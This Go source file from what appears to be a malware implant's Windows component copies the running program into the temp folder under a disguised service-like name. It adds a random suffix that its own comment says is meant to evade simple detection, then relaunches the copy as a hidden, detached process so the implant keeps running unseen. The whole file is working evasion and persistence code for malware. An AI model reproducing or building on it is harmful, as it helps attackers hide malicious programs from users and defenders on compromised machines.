// implant/relaunch_windows.go
//go:build windows

package main

import (
	"fmt"
	"math/rand"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"syscall"
	"time"
)

func init() {
	relaunchAsDaemonInternal = relaunchDaemonWindows
}

// relaunchDaemonWindows copies the current executable to a new name in TempDir,
// then executes it detached and hidden.
// targetName is used as the base for the new filename.
// bgEnvMarkerKey is the environment variable key to set for the new process to mark it as backgrounded.
// origPathEnvKey is the environment variable key for the original launcher path.
// origPathEnvValue is the actual path of the initial launcher.
func relaunchDaemonWindows(currentExePath string, args []string, desiredTargetName string, bgEnvMarkerKey string, origPathEnvKey string, origPathEnvValue string) error {
	// Use a more Windows-friendly innocuous name.
	// If desiredTargetName is something like "[kthreadd]", use a default.
	// Otherwise, use desiredTargetName, ensuring it ends with .exe.
	effectiveBaseName := "audiosrvhost.exe" // Example default innocuous name
	if desiredTargetName != "" && !strings.ContainsAny(desiredTargetName, "[]/:\\*?\"<>|") {
		effectiveBaseName = desiredTargetName
	}

	// Create a somewhat unique name to avoid collisions and simple detection
	r := rand.New(rand.NewSource(time.Now().UnixNano()))
	uniqueSuffix := fmt.Sprintf("%d_%d", time.Now().UnixNano(), r.Intn(10000))
	newExeName := strings.TrimSuffix(effectiveBaseName, ".exe") + "_" + uniqueSuffix + ".exe"

	tempDir := os.TempDir()
	newExePath := filepath.Join(tempDir, newExeName)

	// Copy current executable to newExePath
	inputBytes, err := os.ReadFile(currentExePath)
	if err != nil {
		return fmt.Errorf("failed to read current executable '%s': %v", currentExePath, err)
	}

	err = os.WriteFile(newExePath, inputBytes, 0755)
	if err != nil {
		return fmt.Errorf("failed to write new executable to '%s': %v", newExePath, err)
	}

	// Prepare to launch the new (copied and renamed) executable
	cmd := exec.Command(newExePath, args...) // args is currently empty from main.go call

	// Set the environment variables for the new process
	cmd.Env = append(os.Environ(), fmt.Sprintf("%s=1", bgEnvMarkerKey))
	cmd.Env = append(cmd.Env, fmt.Sprintf("%s=%s", origPathEnvKey, origPathEnvValue))

	// Set attributes for detached, no-window process
	// CREATE_NO_WINDOW (0x08000000) prevents console window for console apps.
	// DETACHED_PROCESS (0x00000008) makes it run independently of the launching console.
	cmd.SysProcAttr = &syscall.SysProcAttr{
		HideWindow:    true,
		CreationFlags: 0x08000000 | 0x00000008, // CREATE_NO_WINDOW | DETACHED_PROCESS
	}

	// Start the command. We don't call Wait() because we want it to run in the background.
	err = cmd.Start()
	if err != nil {
		// If starting fails, try to clean up the copied executable
		_ = os.Remove(newExePath)
		return fmt.Errorf("failed to start new process '%s': %v", newExePath, err)
	}

	// Release the child process so it can run independently.
	// The parent (this initial launcher) will then exit.
	if cmd.Process != nil {
		// On Windows, releasing the process handle allows the parent to exit
		// while the child continues running independently.
		_ = cmd.Process.Release() // Intentionally ignore error, best effort.
	}

	// The initial launcher process (this one) will now exit, leaving the new one running.
	// The new process, when it eventually needs to self-destruct, will delete newExePath.
	return nil
}
